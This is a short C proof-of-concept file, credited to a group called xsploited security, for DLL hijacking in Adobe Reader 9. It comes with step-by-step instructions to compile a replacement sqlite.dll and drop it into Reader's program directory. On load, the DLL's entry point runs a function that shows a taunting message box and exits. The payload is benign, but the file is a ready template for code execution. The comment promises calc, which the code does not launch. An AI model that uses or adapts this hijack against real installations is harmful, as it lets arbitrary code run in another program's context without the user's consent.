/*
Description:
A vulnerability exists in windows that allows other applications dynamic link libraries
to execute malicious code without the users consent, in the privelage context of the targeted application.

Title: Adobe Reader 9 dll (sqlite.dll) Hijacking exploit
Author: xsploited security
URL: http://www.x-sploited.com/
Email: xsploitedsecurity[at]gmail.com

Instructions:

1. Compile dll
2. Replace sqlite.dll in Acrobat Reader program directory with your newly compiled dll
3. Launch Reader
4. Boom calc!
*/

#include <windows.h>

int pwnme()
{
  MessageBox(0, "All of your dll are belong to us!", "Hi sirs", MB_OK);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  pwnme();
  return 0;
}